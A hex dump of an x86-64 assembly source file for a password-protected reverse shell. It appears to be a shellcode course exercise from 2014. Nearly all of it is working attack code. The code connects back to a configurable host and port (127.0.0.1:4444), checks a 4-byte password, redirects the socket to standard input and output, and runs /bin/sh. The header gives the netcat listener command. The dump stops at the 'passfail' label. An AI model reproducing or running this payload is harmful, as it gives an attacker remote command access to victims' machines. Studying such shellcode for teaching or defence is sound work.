00000000  3b 20 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |; ==============|
00000010  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000040  3d 3d 3d 3d 3d 0a 3b 20  50 61 73 73 77 6f 72 64  |=====.; Password|
00000050  20 50 72 6f 74 65 63 74  65 64 20 52 65 76 65 72  | Protected Rever|
00000060  73 65 20 53 68 65 6c 6c  0a 3b 20 41 75 74 68 6f  |se Shell.; Autho|
00000070  72 3a 20 53 4c 41 45 36  34 2d 31 33 35 31 20 28  |r: SLAE64-1351 (|
00000080  4b 65 79 6d 61 6e 29 0a  3b 20 44 61 74 65 3a 20  |Keyman).; Date: |
00000090  30 34 2f 30 39 2f 32 30  31 34 0a 3b 0a 3b 20 53  |04/09/2014.;.; S|
000000a0  68 65 6c 6c 63 6f 64 65  20 6c 65 6e 67 74 68 3a  |hellcode length:|
000000b0  20 20 31 33 36 20 62 79  74 65 73 0a 3b 0a 3b 20  |  136 bytes.;.; |
000000c0  44 65 73 63 72 69 70 74  69 6f 6e 3a 0a 3b 0a 3b  |Description:.;.;|
000000d0  20 20 20 20 53 69 6d 70  6c 65 20 72 65 76 65 72  |    Simple rever|
000000e0  73 65 20 73 68 65 6c 6c  20 28 6c 69 73 74 65 6e  |se shell (listen|
000000f0  73 20 6f 6e 20 70 6f 72  74 20 34 34 34 34 20 62  |s on port 4444 b|
00000100  79 20 64 65 66 61 75 6c  74 29 20 77 69 74 68 0a  |y default) with.|
00000110  3b 20 20 20 20 62 79 74  65 73 20 70 61 73 73 77  |;    bytes passw|
00000120  6f 72 64 20 70 72 6f 74  65 63 74 69 6f 6e 2e 20  |ord protection. |
00000130  55 73 69 6e 67 20 61 20  34 20 62 79 74 65 73 20  |Using a 4 bytes |
00000140  6c 6f 6e 67 20 70 61 73  73 77 6f 72 64 20 69 73  |long password is|
00000150  0a 3b 20 20 20 20 73 74  69 6c 6c 20 72 65 61 73  |.;    still reas|
00000160  6f 6e 61 62 6c 79 20 73  74 72 6f 6e 67 20 66 6f  |onably strong fo|
00000170  72 20 61 20 73 69 6e 67  6c 65 2d 73 68 6f 74 20  |r a single-shot |
00000180  63 6f 6e 6e 65 63 74 69  6f 6e 20 61 6e 64 20 6b  |connection and k|
00000190  65 65 70 73 0a 3b 20 20  20 20 74 68 65 20 63 6f  |eeps.;    the co|
000001a0  64 65 20 73 68 6f 72 74  65 72 2e 0a 3b 0a 3b 20  |de shorter..;.; |
000001b0  20 20 20 54 6f 20 63 68  61 6e 67 65 20 74 68 65  |   To change the|
000001c0  20 70 6f 72 74 20 6f 72  20 74 68 65 20 70 61 73  | port or the pas|
000001d0  73 77 6f 72 64 20 6a 75  73 74 20 6d 6f 64 69 66  |sword just modif|
000001e0  79 20 74 68 65 20 76 61  6c 75 65 73 20 6f 66 20  |y the values of |
000001f0  74 68 65 0a 3b 20 20 20  20 65 78 70 5f 70 6f 72  |the.;    exp_por|
00000200  74 20 61 6e 64 20 65 78  70 5f 70 61 73 73 20 22  |t and exp_pass "|
00000210  76 61 72 69 61 62 6c 65  73 22 20 62 65 6c 6f 77  |variables" below|
00000220  2e 0a 3b 0a 3b 20 20 20  20 42 65 66 6f 72 65 20  |..;.;    Before |
00000230  74 68 65 20 63 6f 64 65  20 67 65 74 73 20 65 78  |the code gets ex|
00000240  65 63 75 74 65 64 20 6d  61 6b 65 20 73 75 72 65  |ecuted make sure|
00000250  20 74 6f 20 63 72 65 61  74 65 20 61 20 6c 69 73  | to create a lis|
00000260  74 65 6e 65 72 3a 0a 3b  20 20 20 0a 3b 20 20 20  |tener:.;   .;   |
00000270  20 6e 63 20 2d 6c 76 70  20 3c 70 6f 72 74 20 6e  | nc -lvp <port n|
00000280  75 6d 62 65 72 3e 0a 3b  0a 3b 20 20 20 20 41 66  |umber>.;.;    Af|
00000290  74 65 72 20 79 6f 75 20  72 65 63 65 69 76 65 20  |ter you receive |
000002a0  74 68 65 20 63 6f 6e 6e  65 63 74 69 6f 6e 20 79  |the connection y|
000002b0  6f 75 20 77 69 6c 6c 20  73 65 65 20 6e 6f 20 70  |ou will see no p|
000002c0  61 73 73 77 6f 72 64 0a  3b 20 20 20 20 70 72 6f  |assword.;    pro|
000002d0  6d 70 74 2e 20 4a 75 73  74 20 74 79 70 65 20 69  |mpt. Just type i|
000002e0  6e 20 74 68 65 20 34 20  62 79 74 65 73 20 6c 6f  |n the 4 bytes lo|
000002f0  6e 67 20 70 61 73 73 77  6f 72 64 20 61 6e 64 20  |ng password and |
00000300  68 69 74 20 65 6e 74 65  72 2e 0a 3b 20 20 20 20  |hit enter..;    |
00000310  49 66 20 74 68 65 20 70  61 73 73 77 6f 72 64 20  |If the password |
00000320  6d 61 74 63 68 65 73 2c  20 79 6f 75 20 61 72 65  |matches, you are|
00000330  20 72 65 61 64 79 20 74  6f 20 74 79 70 65 20 4f  | ready to type O|
00000340  53 20 63 6f 6d 6d 61 6e  64 73 2e 0a 3b 0a 3b 20  |S commands..;.; |
00000350  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000390  3d 3d 3d 0a 20 0a 67 6c  6f 62 61 6c 20 5f 73 74  |===. .global _st|
000003a0  61 72 74 0a 73 65 63 74  69 6f 6e 20 2e 74 65 78  |art.section .tex|
000003b0  74 0a 20 0a 3b 20 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |t. .; ----------|
000003c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000003f0  2d 2d 2d 2d 2d 2d 2d 2d  2d 0a 3b 20 50 72 65 70  |---------.; Prep|
00000400  72 6f 63 65 73 73 6f 72  20 64 69 72 65 63 74 69  |rocessor directi|
00000410  76 65 73 20 73 6f 20 79  6f 75 20 63 61 6e 20 65  |ves so you can e|
00000420  61 73 69 6c 79 20 63 68  61 6e 67 65 20 74 68 65  |asily change the|
00000430  20 70 6f 72 74 20 61 6e  64 20 74 68 65 0a 3b 20  | port and the.; |
00000440  70 61 73 73 77 6f 72 64  2e 0a 3b 20 2d 2d 2d 2d  |password..; ----|
00000450  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000480  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 0a  |---------------.|
00000490  20 0a 3b 20 48 6f 73 74  20 74 6f 20 63 6f 6e 6e  | .; Host to conn|
000004a0  65 63 74 20 74 6f 2e 20  50 6c 65 61 73 65 20 6e  |ect to. Please n|
000004b0  6f 74 65 20 74 68 61 74  20 74 68 69 73 20 76 61  |ote that this va|
000004c0  6c 75 65 20 77 69 6c 6c  20 68 61 76 65 0a 3b 20  |lue will have.; |
000004d0  30 78 30 32 30 32 30 32  30 32 20 61 64 64 65 64  |0x02020202 added|
000004e0  20 74 6f 20 69 74 2c 20  74 68 69 73 20 77 61 79  | to it, this way|
000004f0  20 61 76 6f 69 64 69 6e  67 20 74 68 65 20 4e 55  | avoiding the NU|
00000500  4c 4c 20 62 79 74 65 73  2e 0a 20 0a 25 64 65 66  |LL bytes.. .%def|
00000510  69 6e 65 20 65 78 70 5f  68 6f 73 74 20 20 20 20  |ine exp_host    |
00000520  30 78 46 45 46 44 46 45  37 44 20 20 20 20 20 20  |0xFEFDFE7D      |
00000530  3b 20 31 32 37 2e 30 2e  30 2e 31 0a 20 0a 3b 20  |; 127.0.0.1. .; |
00000540  50 6f 72 74 20 6e 75 6d  62 65 72 20 74 6f 20 6c  |Port number to l|
00000550  69 73 74 65 6e 20 6f 6e  2e 0a 25 64 65 66 69 6e  |isten on..%defin|
00000560  65 20 65 78 70 5f 70 6f  72 74 20 20 20 20 20 20  |e exp_port      |
00000570  20 20 30 78 35 63 31 31  20 20 20 20 20 20 20 20  |  0x5c11        |
00000580  20 20 3b 20 34 34 34 34  0a 20 0a 3b 20 50 61 73  |  ; 4444. .; Pas|
00000590  73 77 6f 72 64 20 74 6f  20 75 73 65 2e 20 4d 61  |sword to use. Ma|
000005a0  6b 65 20 73 75 72 65 20  69 74 27 73 20 6e 6f 74  |ke sure it's not|
000005b0  20 6c 6f 6e 67 65 72 20  74 68 61 6e 20 34 20 62  | longer than 4 b|
000005c0  79 74 65 73 2e 0a 25 64  65 66 69 6e 65 20 65 78  |ytes..%define ex|
000005d0  70 5f 70 61 73 73 20 20  20 20 20 20 20 20 30 78  |p_pass        0x|
000005e0  36 63 36 63 36 35 36 38  20 20 20 20 20 20 3b 20  |6c6c6568      ; |
000005f0  68 65 6c 6c 0a 20 0a 3b  20 2d 2d 2d 2d 2d 2d 2d  |hell. .; -------|
00000600  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000630  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 0a 3b 20 44  |------------.; D|
00000640  4f 20 4e 4f 54 20 54 4f  55 43 48 0a 3b 20 70 72  |O NOT TOUCH.; pr|
00000650  65 70 72 6f 63 65 73 73  6f 72 20 64 69 72 65 63  |eprocessor direc|
00000660  74 69 76 65 73 20 73 6f  20 73 79 73 63 61 6c 6c  |tives so syscall|
00000670  73 20 63 61 6e 20 62 65  20 65 61 73 69 6c 79 20  |s can be easily |
00000680  72 65 66 65 72 65 6e 63  65 64 0a 3b 20 2d 2d 2d  |referenced.; ---|
00000690  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000006d0  0a 20 0a 25 64 65 66 69  6e 65 20 73 79 73 5f 63  |. .%define sys_c|
000006e0  6f 6e 6e 65 63 74 20 34  32 0a 25 64 65 66 69 6e  |onnect 42.%defin|
000006f0  65 20 73 79 73 5f 72 65  61 64 20 20 20 20 20 30  |e sys_read     0|
00000700  0a 25 64 65 66 69 6e 65  20 73 79 73 5f 65 78 65  |.%define sys_exe|
00000710  63 76 65 20 20 35 39 0a  25 64 65 66 69 6e 65 20  |cve  59.%define |
00000720  73 79 73 5f 64 75 70 32  20 20 20 20 33 33 0a 20  |sys_dup2    33. |
00000730  0a 5f 73 74 61 72 74 3a  0a 20 0a 20 20 20 20 3b  |._start:. .    ;|
00000740  20 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | ---------------|
00000750  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000780  0a 20 20 20 20 3b 20 53  54 41 52 54 3a 20 63 72  |.    ; START: cr|
00000790  65 61 74 65 20 73 6f 63  6b 65 74 0a 20 20 20 20  |eate socket.    |
000007a0  3b 20 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |; --------------|
000007b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000007e0  2d 0a 20 20 20 20 20 20  78 6f 72 20 72 61 78 2c  |-.      xor rax,|
000007f0  20 72 61 78 0a 20 20 20  20 20 20 70 75 73 68 20  | rax.      push |
00000800  72 61 78 20 20 20 20 20  20 20 20 20 20 20 20 20  |rax             |
00000810  20 3b 20 73 61 76 69 6e  67 20 66 6f 72 20 73 6f  | ; saving for so|
00000820  63 6b 61 64 64 72 0a 20  20 20 20 20 20 70 75 73  |ckaddr.      pus|
00000830  68 20 72 61 78 20 20 20  20 20 20 20 20 20 20 20  |h rax           |
00000840  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00000850  20 73 74 72 75 63 74 0a  20 20 20 20 20 20 70 75  | struct.      pu|
00000860  73 68 20 72 61 78 20 20  20 20 20 20 20 20 20 20  |sh rax          |
00000870  20 20 20 20 3b 20 63 6c  65 61 72 20 72 61 78 20  |    ; clear rax |
00000880  6c 61 74 65 72 0a 20 20  20 20 20 20 70 75 73 68  |later.      push|
00000890  20 72 61 78 20 20 20 20  20 20 20 20 20 20 20 20  | rax            |
000008a0  20 20 3b 20 73 65 74 20  72 64 78 20 74 6f 20 30  |  ; set rdx to 0|
000008b0  0a 20 20 20 20 20 20 70  6f 70 20 72 64 78 20 20  |.      pop rdx  |
000008c0  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 70  |             ; p|
000008d0  72 6f 74 6f 63 6f 6c 0a  20 20 20 20 20 20 6d 6f  |rotocol.      mo|
000008e0  76 20 61 6c 2c 20 32 0a  20 20 20 20 20 20 70 75  |v al, 2.      pu|
000008f0  73 68 20 72 61 78 0a 20  20 20 20 20 20 70 75 73  |sh rax.      pus|
00000900  68 20 72 61 78 0a 20 20  20 20 20 20 70 6f 70 20  |h rax.      pop |
00000910  72 73 69 0a 20 20 20 20  20 20 70 6f 70 20 72 64  |rsi.      pop rd|
00000920  69 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |i               |
00000930  3b 20 50 46 5f 49 4e 45  54 0a 20 20 20 20 20 20  |; PF_INET.      |
00000940  73 68 72 20 72 73 69 2c  20 31 20 20 20 20 20 20  |shr rsi, 1      |
00000950  20 20 20 20 20 20 3b 20  53 4f 43 4b 5f 53 54 52  |      ; SOCK_STR|
00000960  45 41 4d 0a 20 20 20 20  20 20 61 64 64 20 61 6c  |EAM.      add al|
00000970  2c 20 33 39 20 20 20 20  20 20 20 20 20 20 20 20  |, 39            |
00000980  3b 20 73 6f 63 6b 65 74  20 73 79 73 63 61 6c 6c  |; socket syscall|
00000990  20 28 34 31 29 0a 20 20  20 20 20 20 73 79 73 63  | (41).      sysc|
000009a0  61 6c 6c 0a 20 0a 20 20  20 20 3b 20 2d 2d 2d 2d  |all. .    ; ----|
000009b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000009e0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 0a 20 20 20 20  |-----------.    |
000009f0  3b 20 53 54 41 52 54 3a  20 63 72 65 61 74 65 20  |; START: create |
00000a00  73 74 72 75 63 74 0a 20  20 20 20 3b 0a 20 20 20  |struct.    ;.   |
00000a10  20 3b 20 73 72 76 5f 61  64 64 72 2e 73 69 6e 5f  | ; srv_addr.sin_|
00000a20  66 61 6d 69 6c 79 20 3d  20 41 46 5f 49 4e 45 54  |family = AF_INET|
00000a30  3b 0a 20 20 20 20 3b 20  73 72 76 5f 61 64 64 72  |;.    ; srv_addr|
00000a40  2e 73 69 6e 5f 61 64 64  72 2e 73 5f 61 64 64 72  |.sin_addr.s_addr|
00000a50  20 3d 20 49 4e 41 44 44  52 5f 41 4e 59 3b 0a 20  | = INADDR_ANY;. |
00000a60  20 20 20 3b 20 73 72 76  5f 61 64 64 72 2e 73 69  |   ; srv_addr.si|
00000a70  6e 5f 70 6f 72 74 20 3d  20 68 74 6f 6e 73 28 70  |n_port = htons(p|
00000a80  6f 72 74 6e 6f 29 3b 0a  20 20 20 20 3b 0a 20 20  |ortno);.    ;.  |
00000a90  20 20 3b 20 54 68 69 73  20 69 73 20 68 6f 77 20  |  ; This is how |
00000aa0  69 74 20 6c 6f 6f 6b 73  20 6c 69 6b 65 20 6f 6e  |it looks like on|
00000ab0  20 74 68 65 20 73 74 61  63 6b 3a 0a 20 20 20 20  | the stack:.    |
00000ac0  3b 20 30 78 30 32 20 20  20 20 30 78 30 30 20 20  |; 0x02    0x00  |
00000ad0  20 20 30 78 31 31 20 20  20 20 30 78 35 63 20 20  |  0x11    0x5c  |
00000ae0  20 20 30 78 37 66 20 20  20 20 30 78 30 30 20 20  |  0x7f    0x00  |
00000af0  20 20 30 78 30 30 20 20  20 20 30 78 30 31 0a 20  |  0x00    0x01. |
00000b00  20 20 20 3b 20 30 78 32  30 20 20 20 20 30 78 30  |   ; 0x20    0x0|
00000b10  30 20 20 20 20 30 78 30  30 20 20 20 20 30 78 30  |0    0x00    0x0|
*
00000b40  30 0a 20 20 20 20 3b 20  2d 2d 2d 2d 2d 2d 2d 2d  |0.    ; --------|
00000b50  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000b80  2d 2d 2d 2d 2d 2d 2d 0a  20 0a 20 20 20 20 20 20  |-------. .      |
00000b90  3b 20 54 4f 44 4f 3a 20  68 61 76 65 20 74 6f 20  |; TODO: have to |
00000ba0  6d 61 6b 65 20 74 68 69  73 20 73 68 6f 72 74 65  |make this shorte|
00000bb0  72 20 73 6f 6d 65 68 6f  77 0a 20 20 20 20 20 20  |r somehow.      |
00000bc0  6d 6f 76 20 62 79 74 65  20 5b 72 73 70 5d 2c 20  |mov byte [rsp], |
00000bd0  32 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |2               |
00000be0  20 20 3b 20 73 65 74 20  76 61 6c 75 65 73 0a 20  |  ; set values. |
00000bf0  20 20 20 20 20 6d 6f 76  20 77 6f 72 64 20 5b 72  |     mov word [r|
00000c00  73 70 2b 32 5d 2c 20 65  78 70 5f 70 6f 72 74 0a  |sp+2], exp_port.|
00000c10  20 20 20 20 20 20 6d 6f  76 20 64 77 6f 72 64 20  |      mov dword |
00000c20  5b 72 73 70 2b 34 5d 2c  20 65 78 70 5f 68 6f 73  |[rsp+4], exp_hos|
00000c30  74 0a 20 20 20 20 20 20  61 64 64 20 64 77 6f 72  |t.      add dwor|
00000c40  64 20 5b 72 73 70 2b 34  5d 2c 20 30 78 30 32 30  |d [rsp+4], 0x020|
00000c50  32 30 32 30 32 0a 20 20  20 20 20 20 70 75 73 68  |20202.      push|
00000c60  20 72 73 70 0a 20 20 20  20 20 20 70 6f 70 20 72  | rsp.      pop r|
00000c70  73 69 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |si              |
00000c80  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 61  |             ; a|
00000c90  64 64 72 20 6f 66 20 73  74 72 75 63 74 20 69 6e  |ddr of struct in|
00000ca0  20 72 73 69 0a 20 0a 20  20 20 20 3b 20 2d 2d 2d  | rsi. .    ; ---|
00000cb0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000ce0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 0a 20 20 20  |------------.   |
00000cf0  20 3b 20 53 54 41 52 54  3a 20 63 6f 6e 6e 65 63  | ; START: connec|
00000d00  74 0a 20 20 20 20 3b 20  2d 2d 2d 2d 2d 2d 2d 2d  |t.    ; --------|
00000d10  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000d40  2d 2d 2d 2d 2d 2d 2d 0a  20 0a 20 20 20 20 20 20  |-------. .      |
00000d50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00000d60  72 64 78 20 69 73 20 73  74 69 6c 6c 20 30 0a 20  |rdx is still 0. |
00000d70  20 20 20 20 20 70 75 73  68 20 72 61 78 20 20 20  |     push rax   |
00000d80  20 20 20 20 20 20 20 20  20 20 20 3b 20 73 6f 63  |           ; soc|
00000d90  6b 65 74 20 66 64 0a 20  20 20 20 20 20 70 6f 70  |ket fd.      pop|
00000da0  20 72 64 69 0a 20 20 20  20 20 20 61 64 64 20 64  | rdi.      add d|
00000db0  6c 2c 20 31 36 0a 20 20  20 20 20 20 6d 6f 76 20  |l, 16.      mov |
00000dc0  61 6c 2c 20 73 79 73 5f  63 6f 6e 6e 65 63 74 0a  |al, sys_connect.|
00000dd0  20 20 20 20 20 20 73 79  73 63 61 6c 6c 0a 20 0a  |      syscall. .|
00000de0  20 20 20 20 3b 20 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |    ; ----------|
00000df0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000e20  2d 2d 2d 2d 2d 0a 20 20  20 20 3b 20 67 65 74 20  |-----.    ; get |
00000e30  70 61 73 73 77 64 0a 20  20 20 20 3b 0a 20 20 20  |passwd.    ;.   |
00000e40  20 3b 20 57 65 20 77 69  6c 6c 20 77 6f 72 6b 20  | ; We will work |
00000e50  77 69 74 68 20 61 20 34  20 62 79 74 65 20 70 61  |with a 4 byte pa|
00000e60  73 73 77 6f 72 64 2c 20  73 68 6f 75 6c 64 20 62  |ssword, should b|
00000e70  65 20 6d 6f 72 65 20 74  68 61 6e 0a 20 20 20 20  |e more than.    |
00000e80  3b 20 65 6e 6f 75 67 68  20 61 73 20 6e 6f 20 62  |; enough as no b|
00000e90  72 75 74 65 20 66 6f 72  63 69 6e 67 20 69 73 20  |rute forcing is |
00000ea0  70 6f 73 73 69 62 6c 65  2e 20 43 68 61 6e 63 65  |possible. Chance|
00000eb0  73 20 74 6f 20 67 75 65  73 73 0a 20 20 20 20 3b  |s to guess.    ;|
00000ec0  20 74 68 65 20 72 69 67  68 74 20 76 61 6c 75 65  | the right value|
00000ed0  20 69 73 20 30 2e 20 20  4f 66 20 63 6f 75 72 73  | is 0.  Of cours|
00000ee0  65 20 70 61 73 73 77 64  20 73 68 6f 75 6c 64 20  |e passwd should |
00000ef0  6e 6f 74 20 63 6f 6e 74  61 69 6e 0a 20 20 20 20  |not contain.    |
00000f00  3b 20 6e 75 6c 6c 20 62  79 74 65 73 2e 0a 20 20  |; null bytes..  |
00000f10  20 20 3b 0a 20 20 20 20  3b 20 6e 20 3d 20 72 65  |  ;.    ; n = re|
00000f20  61 64 28 6e 65 77 73 6f  63 6b 66 64 2c 62 75 66  |ad(newsockfd,buf|
00000f30  66 65 72 2c 34 29 3b 0a  20 20 20 20 3b 20 2d 2d  |fer,4);.    ; --|
00000f40  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000f70  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0a 20 0a  |-------------. .|
00000f80  20 20 20 20 20 20 70 75  73 68 20 72 61 78 20 20  |      push rax  |
00000f90  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 62 75  |            ; bu|
00000fa0  66 66 65 72 20 66 69 6c  6c 65 64 20 77 69 74 68  |ffer filled with|
00000fb0  20 30 73 0a 20 20 20 20  20 20 70 75 73 68 20 72  | 0s.      push r|
00000fc0  73 70 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |sp              |
00000fd0  3b 20 73 65 74 75 70 20  70 6f 69 6e 74 65 72 20  |; setup pointer |
00000fe0  74 6f 20 62 75 66 0a 20  20 20 20 20 20 70 6f 70  |to buf.      pop|
00000ff0  20 72 73 69 0a 20 20 20  20 20 20 73 75 62 20 72  | rsi.      sub r|
00001000  64 78 2c 20 31 32 20 20  20 20 20 20 20 20 20 20  |dx, 12          |
00001010  20 3b 20 73 65 74 20 62  79 74 65 73 20 74 6f 20  | ; set bytes to |
00001020  72 65 61 64 20 28 34 29  0a 20 20 20 20 20 20 73  |read (4).      s|
00001030  79 73 63 61 6c 6c 0a 20  0a 20 20 20 20 20 20 3b  |yscall. .      ;|
00001040  20 63 6f 6d 70 61 72 65  20 70 61 73 73 20 72 65  | compare pass re|
00001050  63 65 69 76 65 64 20 77  69 74 68 20 76 61 6c 69  |ceived with vali|
00001060  64 20 70 61 73 73 20 61  6e 64 20 65 78 69 74 20  |d pass and exit |
00001070  69 66 20 6e 6f 20 6d 61  74 63 68 0a 20 0a 20 20  |if no match. .  |
00001080  20 20 20 20 70 75 73 68  20 72 61 78 0a 20 20 20  |    push rax.   |
00001090  20 20 20 70 6f 70 20 72  63 78 0a 20 0a 20 20 20  |   pop rcx. .   |
000010a0  20 20 20 70 75 73 68 20  72 64 69 20 20 20 20 20  |   push rdi     |
000010b0  20 20 20 20 20 20 20 20  20 3b 20 73 61 76 65 20  |         ; save |
000010c0  73 6f 63 6b 65 74 0a 20  20 20 20 20 20 70 6f 70  |socket.      pop|
000010d0  20 72 61 78 0a 20 0a 20  20 20 20 20 20 73 75 62  | rax. .      sub|
000010e0  20 72 63 78 2c 20 33 20  20 20 20 20 20 20 20 20  | rcx, 3         |
000010f0  20 20 20 3b 20 72 65 61  64 20 6f 6e 6c 79 20 6f  |   ; read only o|
00001100  6e 63 65 0a 20 20 20 20  20 20 70 75 73 68 20 72  |nce.      push r|
00001110  73 70 0a 20 20 20 20 20  20 70 6f 70 20 72 64 69  |sp.      pop rdi|
00001120  0a 20 20 20 20 20 20 70  75 73 68 20 65 78 70 5f  |.      push exp_|
00001130  70 61 73 73 0a 20 20 20  20 20 20 70 75 73 68 20  |pass.      push |
00001140  72 73 70 0a 20 20 20 20  20 20 70 6f 70 20 72 73  |rsp.      pop rs|
00001150  69 0a 20 20 20 20 20 20  63 6d 70 73 71 0a 20 20  |i.      cmpsq.  |
00001160  20 20 20 20 6a 6e 65 20  70 61 73 73 66 61 69 6c  |    jne passfail|
00001170  20 20 20 20 20 20 20 20  20 20 3b 20 70 61 73 73  |          ; pass|
00001180  77 64 20 6d 61 74 63 68  2c 20 67 69 76 65 20 73  |wd match, give s|
00001190  68 65 6c 6c 0a 20 0a 73  68 65 6c 6c 3a 0a 20 20  |hell. .shell:.  |
000011a0  20 20 3b 20 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |  ; ------------|
000011b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000011e0  2d 2d 2d 0a 20 20 20 20  3b 20 36 2e 20 65 78 65  |---.    ; 6. exe|
000011f0  63 20 73 68 65 6c 6c 0a  20 20 20 20 3b 20 2d 2d  |c shell.    ; --|
00001200  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00001230  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0a 20 0a  |-------------. .|
00001240  20 20 20 20 20 20 61 64  64 20 63 6c 2c 20 32 20  |      add cl, 2 |
00001250  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 72 63  |            ; rc|
00001260  78 20 69 73 20 31 2c 20  73 6f 20 61 64 64 20 32  |x is 1, so add 2|
00001270  20 3d 20 33 0a 20 20 20  20 20 20 70 75 73 68 20  | = 3.      push |
00001280  72 61 78 20 20 20 20 20  20 20 20 20 20 20 20 20  |rax             |
00001290  20 3b 20 72 65 73 74 6f  72 65 20 73 6f 63 6b 65  | ; restore socke|
000012a0  74 0a 20 20 20 20 20 20  70 6f 70 20 72 64 69 0a  |t.      pop rdi.|
000012b0  64 75 70 5f 6c 6f 6f 70  3a 0a 20 20 20 20 20 20  |dup_loop:.      |
000012c0  70 75 73 68 20 72 63 78  20 20 20 20 20 20 20 20  |push rcx        |
000012d0  20 20 20 20 20 20 3b 20  68 61 76 65 20 74 6f 20  |      ; have to |
000012e0  73 61 76 65 20 72 63 78  20 61 73 20 64 75 70 32  |save rcx as dup2|
000012f0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00001300  20 20 20 20 20 3b 20 63  68 61 6e 67 65 73 20 69  |     ; changes i|
00001310  74 27 73 20 76 61 6c 75  65 0a 20 20 20 20 20 20  |t's value.      |
00001320  78 6f 72 20 72 61 78 2c  20 72 61 78 0a 20 20 20  |xor rax, rax.   |
00001330  20 20 20 73 75 62 20 72  63 78 2c 20 31 0a 20 20  |   sub rcx, 1.  |
00001340  20 20 20 20 70 75 73 68  20 72 63 78 0a 20 20 20  |    push rcx.   |
00001350  20 20 20 70 6f 70 20 72  73 69 0a 20 20 20 20 20  |   pop rsi.     |
00001360  20 61 64 64 20 61 6c 2c  20 73 79 73 5f 64 75 70  | add al, sys_dup|
00001370  32 0a 20 20 20 20 20 20  73 79 73 63 61 6c 6c 0a  |2.      syscall.|
00001380  20 20 20 20 20 20 70 6f  70 20 72 63 78 20 20 20  |      pop rcx   |
00001390  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 72 65  |            ; re|
000013a0  73 74 6f 72 65 20 74 68  65 20 63 6f 75 6e 74 65  |store the counte|
000013b0  72 0a 20 20 20 20 20 20  6c 6f 6f 70 20 64 75 70  |r.      loop dup|
000013c0  5f 6c 6f 6f 70 0a 20 0a  20 20 20 20 20 20 6a 6d  |_loop. .      jm|
000013d0  70 20 6d 79 74 65 78 74  0a 20 0a 63 6f 64 65 3a  |p mytext. .code:|
000013e0  0a 20 20 20 20 20 20 70  6f 70 20 72 64 69 0a 20  |.      pop rdi. |
000013f0  20 20 20 20 20 6d 6f 76  20 5b 72 64 69 2b 37 5d  |     mov [rdi+7]|
00001400  2c 20 42 59 54 45 20 61  6c 0a 20 20 20 20 20 20  |, BYTE al.      |
00001410  70 75 73 68 20 72 61 78  0a 20 20 20 20 20 20 70  |push rax.      p|
00001420  6f 70 20 72 64 78 0a 20  20 20 20 20 20 61 64 64  |op rdx.      add|
00001430  20 61 6c 2c 20 73 79 73  5f 65 78 65 63 76 65 0a  | al, sys_execve.|
00001440  20 20 20 20 20 20 73 79  73 63 61 6c 6c 0a 20 0a  |      syscall. .|
00001450  6d 79 74 65 78 74 3a 0a  20 20 20 20 63 61 6c 6c  |mytext:.    call|
00001460  20 63 6f 64 65 0a 20 20  20 20 4d 79 54 65 78 74  | code.    MyText|
00001470  3a 20 64 62 20 27 2f 62  69 6e 2f 73 68 27 2c 20  |: db '/bin/sh', |
00001480  30 78 34 31 0a 20 0a 70  61 73 73 66 61 69 6c 3a  |0x41. .passfail:|
00001490
